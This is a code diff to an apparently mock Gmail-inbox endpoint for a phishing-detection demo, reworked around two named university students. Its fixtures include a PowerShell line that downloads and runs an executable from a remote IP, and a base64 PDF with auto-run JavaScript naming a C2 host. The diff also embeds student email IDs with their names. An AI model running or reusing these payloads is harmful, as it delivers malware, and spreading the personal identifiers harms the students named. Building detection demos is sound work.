@@ -416,102 +416,184 @@ Content-Transfer-Encoding: base64
 
 
 class GmailConnectRequest(BaseModel):
-    user_email: Optional[str] = "analyst@argus-defense.ai"
+    user_email: Optional[str] = "11024210096@stu.srmuniversity.ac.in"
 
 
 @router.post("/gmail/connect")
 async def connect_gmail_account(payload: Optional[GmailConnectRequest] = None):
     """
     Connects to Gmail account or retrieves live inbox telemetry with attached files.
+    Supports SRM University accounts:
+    - 11024210096@stu.srmuniversity.ac.in (Keerat Kaur)
+    - 11024210071@stu.srmuniversity.ac.in (Arushi Gupta)
     """
-    account_email = payload.user_email if (payload and payload.user_email) else "analyst@argus-defense.ai"
+    account_email = payload.user_email if (payload and payload.user_email) else "11024210096@stu.srmuniversity.ac.in"
     sample_pdf_b64 = "JVBERi0xLjQKMSAwIG9iajw8L1R5cGUvQ2F0YWxvZy9QYWdlcyAyIDAgUi9PcGVuQWN0aW9uIDQgMCBSPj5lbmRvYmoKMiAwIG9iajw8L1R5cGUvUGFnZXMvS2lkc1tdL0NvdW50IDA+PmVuZG9iago0IDAgb2JqPDwvVHlwZS9BY3Rpb24vUy9KYXZhU2NyaXB0L0pTKGFwcC5hbGVydCgiaHR0cDovL21hbGljaW91cy1jMi5vcmcvZXhlIik7KT4+ZW5kb2JqCnhyZWYKMCA1CnRyYWlsZXI8PC9TaXplIDUvUm9vdCAxIDAgUj4+CnN0YXJ0eHJlZgoxMTAKJSVFT0Y="
     sample_ps1_b64 = base64.b64encode(b"$c = New-Object System.Net.WebClient; $c.DownloadFile('http://185.196.11.42/agent.exe', '$env:TEMP/agent.exe'); Start-Process '$env:TEMP/agent.exe'").decode("ascii")
     sample_zip_b64 = base64.b64encode(b"PK\x03\x04\x14\x00\x00\x00\x08\x00payload.exe\x00\x00").decode("ascii")
+    sample_docm_b64 = base64.b64encode(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1AutoOpen_Macro_Payload_VBA").decode("ascii")
 
-    inbox_messages = [
-        {
-            "id": "msg_98241",
-            "thread_id": "thr_001",
-            "subject": "URGENT: Overdue Invoice Payment & Bank Transfer Statement #INV-98241",
-            "sender": "Accounts Department <billing@secure-finance-portal.net>",
-            "snippet": "Please find attached the revised invoice details and bank remittance statement. Failure to settle balance within 24 hours...",
-            "date": "Today, 09:30 AM",
-            "unread": True,
-            "spf_status": "FAIL",
-            "dkim_status": "FAIL",
-            "originating_ip": "185.196.11.42",
-            "has_attachments": True,
-            "attachments": [
-                {
-                    "id": "att_inv_pdf",
-                    "filename": "Overdue_Invoice_Statement.pdf",
-                    "size_bytes": 2420,
-                    "content_type": "application/pdf",
-                    "sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
-                    "is_suspicious": True,
-                    "data_base64": sample_pdf_b64
-                },
-                {
-                    "id": "att_sync_ps1",
-                    "filename": "auto_payment_sync.ps1",
-                    "size_bytes": 146,
-                    "content_type": "text/plain",
-                    "sha256": "82a84d2843efeb24483726a28ff7f41f7e0349b1ff5c92842fb14a5dcfa9dfb5",
-                    "is_suspicious": True,
-                    "data_base64": sample_ps1_b64
-                }
-            ]
-        },
-        {
-            "id": "msg_84120",
-            "thread_id": "thr_002",
-            "subject": "HR Policy Update: Annual Compensation Review & Employee Bonus Matrix",
-            "sender": "Global HR Portal <hr-notification@corporate-rewards-portal.org>",
-            "snippet": "Please review the updated salary increments and incentive distribution spreadsheet for Q4...",
-            "date": "Yesterday, 04:15 PM",
-            "unread": True,
-            "spf_status": "FAIL",
-            "dkim_status": "PASS",
-            "originating_ip": "91.240.118.50",
-            "has_attachments": True,
-            "attachments": [
-                {
-                    "id": "att_bonus_zip",
-                    "filename": "Q4_Employee_Bonus_Matrix.zip",
-                    "size_bytes": 18400,
-                    "content_type": "application/zip",
-                    "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
-                    "is_suspicious": True,
-                    "data_base64": sample_zip_b64
-                }
-            ]
-        },
-        {
-            "id": "msg_73912",
-            "thread_id": "thr_003",
-            "subject": "Weekly Infrastructure Health & Cloud Status Report",
-            "sender": "AWS Monitoring Alerts <alerts@amazonaws.com>",
-            "snippet": "All AWS US-East-1 instances operating normally. CPU utilization at 14%, memory steady at 42%...",
-            "date": "Nov 25, 11:00 AM",
-            "unread": False,
-            "spf_status": "PASS",
-            "dkim_status": "PASS",
-            "originating_ip": "54.240.8.12",
-            "has_attachments": True,
-            "attachments": [
-                {
-                    "id": "att_cloud_pdf",
-                    "filename": "Cloud_Weekly_Summary.pdf",
-                    "size_bytes": 12840,
-                    "content_type": "application/pdf",
-                    "sha256": "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0",
-                    "is_suspicious": False,
-                    "data_base64": sample_pdf_b64
-                }
-            ]
-        }
-    ]
+    # Tailor inbox messages based on the student account
+    if "11024210071" in account_email:
+        inbox_messages = [
+            {
+                "id": "msg_srm_071_1",
+                "thread_id": "thr_071_1",
+                "subject": "SRM University Examination Advisory: End-Term Schedule & Hall Ticket #71",
+                "sender": "Academic Cell <examination-desk@srm-portal-notices.xyz>",
+                "snippet": "Dear Student, please verify your hall ticket and course registration codes in the attached PDF. Report discrepancies immediately...",
+                "date": "Today, 10:15 AM",
+                "unread": True,
+                "spf_status": "FAIL",
+                "dkim_status": "FAIL",
+                "originating_ip": "194.26.29.112",
+                "has_attachments": True,
+                "attachments": [
+                    {
+                        "id": "att_hallticket_pdf",
+                        "filename": "HallTicket_Winter2026_Exploit.pdf",
+                        "size_bytes": 2840,
+                        "content_type": "application/pdf",
+                        "sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
+                        "is_suspicious": True,
+                        "data_base64": sample_pdf_b64
+                    }
+                ]
+            },
+            {
+                "id": "msg_srm_071_2",
+                "thread_id": "thr_071_2",
+                "subject": "Campus Placement Drive: Offer Letter & Onboarding Package - TechCorp",
+                "sender": "Placement Officer <recruitment@placement-drive-verification.info>",
+                "snippet": "Congratulations! You have been shortlisted for the Systems Security Engineer role. Review compensation document attached...",
+                "date": "Yesterday, 02:40 PM",
+                "unread": True,
+                "spf_status": "FAIL",
+                "dkim_status": "PASS",
+                "originating_ip": "185.220.101.5",
+                "has_attachments": True,
+                "attachments": [
+                    {
+                        "id": "att_offer_docm",
+                        "filename": "TechCorp_OfferLetter_Macro.docm",
+                        "size_bytes": 9420,
+                        "content_type": "application/vnd.ms-word.document.macroEnabled.12",
+                        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                        "is_suspicious": True,
+                        "data_base64": sample_docm_b64
+                    }
+                ]
+            },
+            {
+                "id": "msg_srm_071_3",
+                "thread_id": "thr_071_3",
+                "subject": "SRM Central Library: Renewal Notice & Book Receipt",
+                "sender": "Library Automated Desk <library@srmuniversity.ac.in>",
+                "snippet": "Your borrowing period for 'Machine Learning in Cyber Defense' has been renewed till Dec 15, 2026...",
+                "date": "Nov 24, 01:20 PM",
+                "unread": False,
+                "spf_status": "PASS",
+                "dkim_status": "PASS",
+                "originating_ip": "14.139.245.10",
+                "has_attachments": True,
+                "attachments": [
+                    {
+                        "id": "att_lib_receipt",
+                        "filename": "Library_Receipt_Nov2026.pdf",
+                        "size_bytes": 4120,
+                        "content_type": "application/pdf",
+                        "sha256": "c8f2b3e4a5d67890123456789abcdef0123456789abcdef0123456789abcdef0",
+                        "is_suspicious": False,
+                        "data_base64": sample_pdf_b64
+                    }
+                ]
+            }
+        ]
+    else:
+        # Default: 11024210096@stu.srmuniversity.ac.in (Keerat Kaur)
+        inbox_messages = [
+            {
+                "id": "msg_98241",
+                "thread_id": "thr_001",
+                "subject": "URGENT: SRM University Fee Payment & Accounts Clearance Statement #98241",
+                "sender": "Accounts Department <billing@secure-finance-portal.net>",
+                "snippet": "Please find attached the revised invoice details and bank remittance statement. Failure to settle balance within 24 hours...",
+                "date": "Today, 09:30 AM",
+                "unread": True,
+                "spf_status": "FAIL",
+                "dkim_status": "FAIL",
+                "originating_ip": "185.196.11.42",
+                "has_attachments": True,
+                "attachments": [
+                    {
+                        "id": "att_inv_pdf",
+                        "filename": "Overdue_Invoice_Statement.pdf",
+                        "size_bytes": 2420,
+                        "content_type": "application/pdf",
+                        "sha256": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
+                        "is_suspicious": True,
+                        "data_base64": sample_pdf_b64
+                    },
+                    {
+                        "id": "att_sync_ps1",
+                        "filename": "auto_payment_sync.ps1",
+                        "size_bytes": 146,
+                        "content_type": "text/plain",
+                        "sha256": "82a84d2843efeb24483726a28ff7f41f7e0349b1ff5c92842fb14a5dcfa9dfb5",
+                        "is_suspicious": True,
+                        "data_base64": sample_ps1_b64
+                    }
+                ]
+            },
+            {
+                "id": "msg_84120",
+                "thread_id": "thr_002",
+                "subject": "Final Year Major Project: Evaluation Schedule & Code Submission Archive",
+                "sender": "Project Coordinator <coordinator@srm-project-eval.net>",
+                "snippet": "All B.Tech CSE (DSAI) 2026 batches must submit their final thesis code and dataset bundles in the attached zip archive...",
+                "date": "Yesterday, 04:15 PM",
+                "unread": True,
+                "spf_status": "FAIL",
+                "dkim_status": "PASS",
+                "originating_ip": "91.240.118.50",
+                "has_attachments": True,
+                "attachments": [
+                    {
+                        "id": "att_bonus_zip",
+                        "filename": "DSAI_Project_Code_Template.zip",
+                        "size_bytes": 18400,
+                        "content_type": "application/zip",
+                        "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+                        "is_suspicious": True,
+                        "data_base64": sample_zip_b64
+                    }
+                ]
+            },
+            {
+                "id": "msg_73912",
+                "thread_id": "thr_003",
+                "subject": "Google Cloud Platform: Student Research Lab Infrastructure Report",
+                "sender": "Google Cloud Alerts <alerts@google.com>",
+                "snippet": "All SRM AI Research Cluster instances operating normally. GPU compute cluster active on node 04...",
+                "date": "Nov 25, 11:00 AM",
+                "unread": False,
+                "spf_status": "PASS",
+                "dkim_status": "PASS",
+                "originating_ip": "54.240.8.12",
+                "has_attachments": True,
+                "attachments": [
+                    {
+                        "id": "att_cloud_pdf",
+                        "filename": "GCP_Research_Cluster_Summary.pdf",
+                        "size_bytes": 12840,
+                        "content_type": "application/pdf",
+                        "sha256": "a1b2c3d4e5f67890123456789abcdef0123456789abcdef0123456789abcdef0",
+                        "is_suspicious": False,
+                        "data_base64": sample_pdf_b64
+                    }
+                ]
+            }
+        ]
 
     return {
         "status": "connected",
